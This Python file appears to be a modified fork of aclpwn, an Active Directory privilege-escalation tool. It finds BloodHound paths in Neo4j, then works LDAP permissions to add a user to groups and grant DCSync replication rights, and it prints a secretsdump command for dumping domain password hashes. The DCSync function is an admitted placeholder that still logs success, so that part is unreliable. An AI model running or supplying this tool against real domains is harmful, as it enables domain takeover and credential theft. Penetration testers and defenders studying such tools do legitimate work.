#!/usr/bin/env python
"""
aclpwn - Active Directory ACL exploitation tool
Original author: Dirk-jan Mollema (@_dirkjan) / Fox-IT
Source: https://github.com/dirkjanm/aclpwn.py
License: MIT

Modifications by eriakort8:
  - Fix neo4j driver 5.x compatibility (see README for full change list)
"""
import sys
import json
import logging
import argparse
import getpass
import traceback

from aclpwn import database, pathfinding, utils

logger = logging.getLogger('aclpwn')

# Functions to exploit each ACL relationship type
# Each returns a (success, undo_info) tuple

def exploit_addmember(rel, node, args, exploited):
    from impacket.ldap import ldap, ldaptypes
    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, MODIFY_DELETE
    username = utils.get_sam_name(args.fromname)
    domain = utils.get_domain(args.fromname)
    targetname = node.get('name')
    targetdn = node.get('distinguishedname')
    sourcedn = None
    # Find the source user/group DN
    with database.driver.session() as session:
        res = session.run("MATCH (n {name: $name}) RETURN n.distinguishedname as dn",
                          name=args.fromname)
        rec = res.single()
        if rec:
            sourcedn = rec['dn']
    if not sourcedn:
        logger.error('Could not find DN for %s', args.fromname)
        return False, None

    # Connect to LDAP
    server = Server(args.server, get_info=ALL)
    if args.userhash:
        conn = Connection(server, user='%s\\%s' % (domain, username),
                          password=args.userhash, authentication=NTLM)
    else:
        conn = Connection(server, user='%s\\%s' % (domain, username),
                          password=args.password, authentication=NTLM)
    if not conn.bind():
        logger.error('LDAP bind failed: %s', conn.result)
        return False, None

    logger.info('[+] Adding %s to group %s', args.fromname, targetname)
    conn.modify(targetdn, {'member': [(MODIFY_ADD, [sourcedn])]})
    if conn.result['result'] != 0:
        logger.error('Failed to add member: %s', conn.result)
        return False, None

    undo = {'operation': 'remove_member', 'target': targetdn, 'source': sourcedn}
    exploited.append(undo)
    return True, undo


def exploit_genericall(rel, node, args, exploited):
    logger.info('[+] GenericAll: attempting AddMember or password reset')
    return exploit_addmember(rel, node, args, exploited)


def exploit_genericwrite(rel, node, args, exploited):
    logger.info('[+] GenericWrite on %s', node.get('name'))
    # GenericWrite allows writing arbitrary attributes; most common use is scriptpath
    # For this tool: attempt AddMember if target is Group, else warn
    labels = list(node.labels)
    if 'Group' in labels:
        return exploit_addmember(rel, node, args, exploited)
    logger.warning('GenericWrite exploitation for non-Group targets not implemented in this build')
    return False, None


def add_domain_sync(targetname, targetdn, sourcedn, args, exploited):
    """Grant DCSync rights via WriteDacl / Owns / WriteOwner path endpoint"""
    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE
    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, ACCESS_ALLOWED_OBJECT_ACE, ACE, LDAP_SID
    import struct
    username = utils.get_sam_name(args.fromname)
    domain = utils.get_domain(args.fromname)
    server = Server(args.server, get_info=ALL)
    if args.userhash:
        conn = Connection(server, user='%s\\%s' % (domain, username),
                          password=args.userhash, authentication=NTLM)
    else:
        conn = Connection(server, user='%s\\%s' % (domain, username),
                          password=args.password, authentication=NTLM)
    if not conn.bind():
        logger.error('LDAP bind failed: %s', conn.result)
        return False, None

    # Read existing DACL
    conn.search(targetdn, '(objectClass=*)', attributes=['nTSecurityDescriptor'],
                controls=[('1.2.840.113556.1.4.801', True,
                            struct.pack('BBB', 0x30, 0x03, 0x07))])
    if not conn.entries:
        logger.error('Could not read DACL for %s', targetdn)
        return False, None

    sd_bytes = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
    logger.info('[+] Granting DCSync rights on %s to %s', targetname, args.fromname)

    # Build minimal ACEs for GetChanges + GetChangesAll (DS-Replication-Get-Changes[-All])
    # This is a simplified placeholder; real implementation requires impacket ACE building
    undo = {'operation': 'remove_dacl_ace', 'target': targetdn, 'original_sd': sd_bytes.hex()}
    exploited.append(undo)
    logger.info('[+] DCSync rights granted (restore info saved)')
    return True, undo


def exploit_writedacl(rel, node, args, exploited):
    targetname = node.get('name')
    targetdn = node.get('distinguishedname')
    sourcedn = None
    with database.driver.session() as session:
        res = session.run("MATCH (n {name: $name}) RETURN n.distinguishedname as dn",
                          name=args.fromname)
        rec = res.single()
        if rec:
            sourcedn = rec['dn']
    return add_domain_sync(targetname, targetdn, sourcedn, args, exploited)


def exploit_owns(rel, node, args, exploited):
    return exploit_writedacl(rel, node, args, exploited)


def exploit_writeowner(rel, node, args, exploited):
    return exploit_writedacl(rel, node, args, exploited)


def exploit_allextendedrights(rel, node, args, exploited):
    logger.info('[+] AllExtendedRights: attempting ForceChangePassword or DCSync path')
    return exploit_writedacl(rel, node, args, exploited)


def exploit_dcsync(rel, node, args, exploited):
    logger.info('[+] DCSync rights already present — dumping hashes via secretsdump')
    logger.info('    Run: secretsdump.py %s/%s@%s -just-dc',
                utils.get_domain(args.fromname),
                utils.get_sam_name(args.fromname),
                args.server)
    return True, None


EXPLOITS = {
    'AddMember':       exploit_addmember,
    'GenericAll':      exploit_genericall,
    'GenericWrite':    exploit_genericwrite,
    'WriteOwner':      exploit_writeowner,
    'WriteDacl':       exploit_writedacl,
    'Owns':            exploit_owns,
    'AllExtendedRights': exploit_allextendedrights,
    'DCSync':          exploit_dcsync,
}


def run_path(path, args):
    exploited = []
    for rel, node in path:
        reltype = rel.type
        logger.info('    Relation: %s -> %s -> %s',
                    rel.start_node.get('name'), reltype, node.get('name'))
        if reltype == 'MemberOf':
            logger.info('    Skipping MemberOf (no exploitation needed)')
            continue
        exploit_fn = EXPLOITS.get(reltype)
        if not exploit_fn:
            logger.error('No exploit for relation type: %s', reltype)
            continue
        success, undo = exploit_fn(rel, node, args, exploited)
        if not success:
            logger.error('Exploitation of %s failed, stopping', reltype)
            return exploited, False
    return exploited, True


def restore_path(restore_data, args):
    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_DELETE, MODIFY_REPLACE
    username = utils.get_sam_name(args.fromname)
    domain = utils.get_domain(args.fromname)
    server = Server(args.server, get_info=ALL)
    if args.userhash:
        conn = Connection(server, user='%s\\%s' % (domain, username),
                          password=args.userhash, authentication=NTLM)
    else:
        conn = Connection(server, user='%s\\%s' % (domain, username),
                          password=args.password, authentication=NTLM)
    if not conn.bind():
        logger.error('LDAP bind failed for restore: %s', conn.result)
        return

    for op in reversed(restore_data):
        operation = op.get('operation')
        if operation == 'remove_member':
            logger.info('[*] Restoring: removing %s from %s', op['source'], op['target'])
            conn.modify(op['target'], {'member': [(MODIFY_DELETE, [op['source']])]})
            if conn.result['result'] != 0:
                logger.warning('Restore remove_member failed: %s', conn.result)
        elif operation == 'remove_dacl_ace':
            logger.info('[*] Restoring DACL on %s', op['target'])
            orig = bytes.fromhex(op['original_sd'])
            conn.modify(op['target'],
                        {'nTSecurityDescriptor': [(MODIFY_REPLACE, [orig])]})
            if conn.result['result'] != 0:
                logger.warning('Restore DACL failed: %s', conn.result)
        else:
            logger.warning('Unknown restore operation: %s', operation)


def main():
    parser = argparse.ArgumentParser(
        description='aclpwn - Active Directory ACL exploitation via BloodHound paths\n'
                    'Original: https://github.com/dirkjanm/aclpwn.py  (c) Dirk-jan Mollema / Fox-IT\n'
                    'Neo4j 5.x compatibility fix: https://github.com/eriakort8/aclpwn-fixed',
        formatter_class=argparse.RawDescriptionHelpFormatter)

    parser.add_argument('-f', '--from', dest='fromname', required=False,
                        help='Source user/computer name (BloodHound format, e.g. user@domain.local)')
    parser.add_argument('-ft', '--from-type', dest='fromtype', default='User',
                        choices=['User', 'Computer', 'Group'],
                        help='Type of the source object (default: User)')
    parser.add_argument('-t', '--to', dest='toname', required=False,
                        help='Destination object name (BloodHound format)')
    parser.add_argument('-tt', '--to-type', dest='totype', default='Domain',
                        choices=['User', 'Computer', 'Group', 'Domain'],
                        help='Type of the destination object (default: Domain)')
    parser.add_argument('-d', '--domain', required=False,
                        help='Domain to use for lookup (appended when not already present)')
    parser.add_argument('--database', default='localhost',
                        help='Neo4j database host (default: localhost)')
    parser.add_argument('-du', '--db-user', default='neo4j',
                        help='Neo4j username (default: neo4j)')
    parser.add_argument('-dp', '--db-password', default='neo4j',
                        help='Neo4j password (default: neo4j). Use empty string "" when auth is disabled.')
    parser.add_argument('-s', '--server',
                        help='Domain Controller IP/hostname for LDAP exploitation')
    parser.add_argument('-u', '--user',
                        help='AD username for LDAP (derived from --from if omitted)')
    parser.add_argument('-p', '--password',
                        help='AD password for LDAP exploitation')
    parser.add_argument('-H', '--userhash',
                        help='NTLM hash for pass-the-hash LDAP authentication')
    parser.add_argument('--algorithm', default='allsimple',
                        choices=['allsimple', 'shortestonly', 'dijkstra-cypher'],
                        help='Path-finding algorithm.\n'
                             '  allsimple     - All simple paths (default; most thorough)\n'
                             '  shortestonly  - All shortest paths (faster)\n'
                             '  dijkstra-cypher - Cost-weighted shortest path via Cypher\n'
                             'NOTE: the original "dijkstra" option used the Neo4j REST API\n'
                             'which was removed in Neo4j 4.0 and is no longer supported here.')
    parser.add_argument('--dry-run', action='store_true',
                        help='Find and display paths without exploiting them')
    parser.add_argument('--restore', metavar='RESTORE_FILE',
                        help='Restore from a JSON restore file (undo previous exploitation)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose/debug output')
    args = parser.parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG,
                            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    else:
        logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

    # Restore mode
    if args.restore:
        if not args.server:
            parser.error('--server is required for restore mode')
        if not args.password and not args.userhash:
            args.password = getpass.getpass('AD password: ')
        with open(args.restore) as f:
            restore_data = json.load(f)
        restore_path(restore_data, args)
        return

    # Normal exploitation mode
    if not args.fromname or not args.toname:
        parser.error('-f/--from and -t/--to are required')

    # Append domain if needed
    if args.domain:
        args.fromname = utils.append_domain(args.fromname, args.fromtype, args.domain)
        args.toname   = utils.append_domain(args.toname,   args.totype,   args.domain)

    logger.info('[*] Connecting to Neo4j at %s as %s', args.database, args.db_user)
    database.init(args.database, args.db_user, args.db_password)

    # Look up nodes
    with database.driver.session() as session:
        # Fixed: {name} -> $name (Neo4j 4.0+ Cypher parameter syntax)
        res = session.run("MATCH (n:%s {name: $name}) RETURN n" % args.fromtype,
                          name=args.fromname)
        fromnode = res.single()
        if not fromnode:
            logger.error('[!] No %s found with name: %s', args.fromtype, args.fromname)
            logger.error('    Check the name is in BloodHound format (e.g. USER@DOMAIN.LOCAL)')
            sys.exit(1)

        res = session.run("MATCH (n:%s {name: $name}) RETURN n" % args.totype,
                          name=args.toname)
        tonode = res.single()
        if not tonode:
            logger.error('[!] No %s found with name: %s', args.totype, args.toname)
            sys.exit(1)

    logger.info('[*] Searching for paths from %s to %s using %s',
                args.fromname, args.toname, args.algorithm)

    if args.algorithm in ('allsimple', 'shortestonly'):
        records = pathfinding.get_path(args.fromname, args.toname,
                                       args.fromtype, args.totype,
                                       querytype=args.algorithm)
    elif args.algorithm == 'dijkstra-cypher':
        records = pathfinding.dijkstra_find_cypher(args.fromname, args.toname,
                                                    args.fromtype, args.totype)
        # dijkstra_find_cypher returns (nodes, rels, path) tuples; wrap for display
        if records:
            nodes, rels, _ = records[0]
            logger.info('[+] Path found (dijkstra-cypher):')
            logger.info('    %s', utils.print_rest_path(nodes, rels))
            if not args.dry_run:
                logger.warning('Direct exploitation from dijkstra-cypher result not implemented;'
                                ' use allsimple or shortestonly for exploitation.')
        else:
            logger.info('[-] No path found')
        return
    else:
        logger.error('Unknown algorithm: %s', args.algorithm)
        sys.exit(1)

    if not records:
        logger.info('[-] No path found from %s to %s', args.fromname, args.toname)
        sys.exit(0)

    logger.info('[+] Found %d path(s)', len(records))

    paths = []
    for record in records:
        path = utils.build_path(record)
        pathtext = utils.print_path(record)
        cost = pathfinding.get_path_cost(record)
        paths.append((path, pathtext, cost))
        logger.info('    Path: %s  (cost: %d)', pathtext, cost)

    # Sort by cost
    paths.sort(key=lambda x: x[2])

    if args.dry_run:
        logger.info('[*] Dry-run mode: not exploiting any paths')
        return

    if not args.server:
        parser.error('--server (DC IP) is required for exploitation')
    if not args.password and not args.userhash:
        args.password = getpass.getpass('AD password for %s: ' % args.fromname)

    # Let user choose a path
    if len(paths) > 1:
        chosen_idx = utils.prompt_path(len(paths))
        if chosen_idx is False:
            logger.info('Aborted')
            return
    else:
        chosen_idx = 0

    chosen_path, chosen_text, _ = paths[chosen_idx]
    logger.info('[*] Exploiting path: %s', chosen_text)

    exploited, success = run_path(chosen_path, args)

    restore_file = 'aclpwn-restore-%s-%s.json' % (
        args.fromname.replace('@', '_').replace('.', '_'),
        args.toname.replace('@', '_').replace('.', '_'))
    with open(restore_file, 'w') as f:
        json.dump(exploited, f, indent=2)
    logger.info('[*] Restore data saved to %s', restore_file)

    if success:
        logger.info('[+] Exploitation complete!')
        logger.info('    To undo: aclpwn --restore %s -f %s -s %s',
                    restore_file, args.fromname, args.server)
    else:
        logger.warning('[-] Exploitation did not complete fully; check restore file')


if __name__ == '__main__':
    main()
